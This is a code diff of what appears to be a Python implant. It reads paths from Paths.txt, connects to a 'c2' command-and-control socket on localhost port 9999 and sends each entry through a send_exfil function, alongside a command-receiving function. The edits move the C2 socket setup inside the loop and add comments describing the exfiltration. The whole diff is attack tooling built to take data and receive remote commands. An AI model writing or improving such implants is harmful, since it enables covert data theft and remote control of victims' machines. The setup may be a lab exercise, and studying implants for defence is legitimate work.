@@ -27,6 +27,7 @@ def recieve_command():
             
     finally:
         # Clean up the connection
+        print("Connection Closed")
         connection.close()
 
 
@@ -39,10 +40,7 @@ def send_exfil(data):
     except:
         print("Error")
 
-# Create a TCP/IP socket
-c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Connect the socket to the port where the server is listening
-c2_server_address = ('localhost', 9999)
+
 
 # Create a TCP/IP socket
 implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -59,20 +57,24 @@ while(True):
     if(True):
         file1 = open('Paths.txt', 'r')
         Lines = file1.readlines()
+        file1.close()
 
-        
+        # Create a TCP/IP socket
+        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect the socket to the port where the server is listening
+        c2_server_address = ('localhost', 9999)
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
         for line in Lines:
+            #exfil the file for each location in Lines
             send_exfil(str.encode(line))
 
+        #attempt to close socket
         try:
             print("Closing Socket")
             c2_socket.close()
+        
+        #in case of error
         except:
             print("error")
-
-
-    
-    
